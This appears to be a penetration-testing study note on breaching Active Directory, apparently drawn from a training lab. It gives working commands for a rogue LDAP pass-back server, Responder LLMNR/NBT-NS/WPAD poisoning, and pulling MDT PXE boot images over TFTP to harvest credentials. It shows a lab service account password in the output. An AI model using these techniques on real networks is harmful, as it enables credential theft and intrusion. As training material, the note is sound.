# Attacking Active Directory

## Tools
Neo4j  
BloodHound  
Impacket Suit  
Tiberius  
***Autorecon***  

## Enumeration
- ***AutoRecon***
- ***Nmap***
- ***Enum4Linux*** to enumerate shares

## LDAP Pass-Back Attacks
This is a common attack against network devices : 
- printers
When you have gained initial access to the internal network.

LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified

***Example :*** The web interface of a network printer.  

- We can edit the LDAP server to our own machine, to enforce the LDAP authentication mecanism
- Intercept this authentication attempt to recover the LDAP credentials.

### Hosting a LDAP server
Let's install and configure
```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

```bash
sudo dpkg-reconfigure -p low slapd
```

- Make sure to ***press No*** when requested if you want to skip server configuration
- For the **DNS domain name, you want to provide your target domain**
- Use this **same name for the Organisation name** as well
- Provide any Administrator password
- **Select MDB** as the LDAP database to use
- For the last two options, ensure the database is not removed when purged
- Move old database files before a new one is created
- We need to ***make our server vulnerable*** by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server ***only supports PLAIN and LOGIN authentication methods.*** To do this, we need to create a new `olcSaslSecProps.ldif` file, with the following content

```olcSaslSecProps.ldif 
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties
1. **olcSaslSecProps**: Specifies the SASL security properties
2. **noanonymous**: Disables mechanisms that support anonymous login
3. **minssf**: Specifies the minimum acceptable security strength with 0, meaning no protection.
- Now we can use the `ldif` file to patch our LDAP server using the following

```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

- We can verify that our rogue LDAP server's configuration has been applied using the following command:

```bash
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

```output
dn:
supportedSASLMechanisms: LOGIN
supportedSASLMechanisms: PLAIN
```
Now, the LDAP server is up

### Listen
```bash
sudo tcpdump -SX -i breachad tcp port 389
```

Disable the LDAP service
```bash
sudo systemctl disable --now slapd
```

## Authentication relays
### SMB (Server Message Block 139/445)
- Corporations rarely work with latest versions 
- Some versions allows a human to intercept the NetNTLM Challenge

### LLMNR, NBT-NS, and WPAD
- `Responder` allows us to perform **MITM attacks** by **poisoning the responses during NetNTLM authentication**, tricking the client into talking to you instead of the actual server they wanted to connect to.  

On a real LAN, Responder will attempt to poison any requests that are detected in :
- `Link-Local Multicast Name Resolution (LLMNR)`, 
- `NetBIOS Name Service (NBT-NS)`
- `Web Proxy Auto-Discovery (WPAD)` 

**LLMNR**
Rather than overburdening network resources such as the DNS servers, hosts can first attempt to determine** if the host they are looking for is on the same local network** by sending out **LLMNR requests** and seeing if any hosts respond. 

**NBT-NS**
The NBT-NS is the precursor protocol to `LLMNR`, and `WPAD` requests are made to try and find a proxy for future HTTP(s) connections.  

**Since these protocols rely on requests broadcasted on the local network, our device would also receive these requests.** 

`Responder` will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. 

By poisoning these requests, `Responder` attempts to force the client to connect to our AttackBox. In the same line, it starts to host several servers such as `SMB`, `HTTP`,` SQL`, and others to capture these requests and force authentication. 

### Intercepting NetNTLM Challenge

`Responder` essentially tries to win the race condition by poisoning the connections before any real device. 
So, Responder is usually limited to poisoning authentication challenges on the local network. 

Although Responder would be able to intercept and poison more authentication requests when executed from our device connected to the LAN of an organisation, it is crucial to understand that this behaviour can be disruptive and thus detected. 

***Activate responder***
```bash
sudo responder -I INTERFACE
```

Responder will now listen for any requests and poison them 
- LLMNR
- NBT-NS
- WPAD


## Microsoft Deployment Toolkit (MDT)
This tool is used to manipulate all machines over the network 
- To download softwares
- To load ISOs
- To apply GPO in Active Directory contexts

MDT can be configured in various ways, for this task, we will focus exclusively on a configuration called **Preboot Execution Environment (PXE) boot.**

### PXE Boot
-  Load and install the OS directly over a network connection.  

PXE boot is usually integrated with DHCP, which means that if DHCP assigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process.  

Once the process is performed, the client will use a `TFTP` connection **to download the PXE boot image.** 

**We can exploit the PXE boot image** for two different purposes:
1. **Inject a privilege escalation vector**, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
2. **Perform password scraping attacks** to recover AD credentials used during the install.

#### PXE Boot Image Retrieval

1. The first piece of information regarding the PXE Boot preconfigure **you would have received via DHCP is the IP of the MDT server**

2. The second piece of information **you would have received** was **the names of the BCD files**. These files store the information relevant to PXE Boots for the different types of architecture.

They look like `x64{327F2D4C-2BE5-4A3F-9F09-A44C40B319F3}.bcd`

3. The first step we need to perform is using `TFTP` and **downloading our BCD file to read the configuration of the MDT server**. 

TFTP is a bit trickier than FTP since we can't list files. 
Instead, we send a file request, and the server will connect back to us via UDP to transfer the file. 
Hence, we need to be accurate when specifying files and file paths. The BCD files are always located in the `/Tmp/ `directory **on the MDT server**. 
We can initiate the `TFTP` transfer using the following command in our SSH session:

```cmd
tftp -i MICROSOFT_DEPLOYMENT_TOOLKIT_MACHINE_IP GET "\Tmp\FILENAME.bcd" conf.bcd
```

Example :

```cmd
tftp -i 10.200.28.202 GET "\Tmp\x64{327F2D4C-2BE5-4A3F-9F09-A44C40B319F3}.bcd" conf.bcd
```

4. With the BCD file now recovered, we will be using ***powerpxe*** to read its contents. **Powerpxe is a PowerShell script** that automatically performs this type of attack but usually with varying results, so it is better to perform a manual approach. 

We will use the `Get-WimFile` function of ***powerpxe*** to recover the locations of the PXE Boot images from the BCD file

```cmd
powershell -executionpolicy bypass
```

```powershell
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
```

5. **WIM files are bootable images** in the **Windows Imaging Format (WIM)**. Now that we have the location of the PXE Boot image, we can again use `TFTP` to download this image

```cmd
tftp -i MICROSOFT_DEPLOYMENT_TOOLKIT_MACHINE_IP GET "PXE Boot Image Location" 
```

Example :

```cmd
tftp -i 10.200.28.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" 
```

This download will take a while since you are downloading a fully bootable and configured Windows image.

#### Recovering Credentials from a PXE Boot Image

- We can exfiltrate stored credentials. 
- There are various attacks that we could stage. 
	- Inject a local administrator user
	- Install the image to have a domain-joined machine.

1. We use ***powerpxe*** to recover the credentials
**Note :** Do this step manually by extracting the image and looking for the `bootstrap.ini` file, where these types of credentials are often stored

```powershell
Get-FindCredentials -WimFile FILENAME.wim
```

Output 
```output
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@
```
## Configurations files
- Tools such as **seatbelt** can be used to harvest configuration files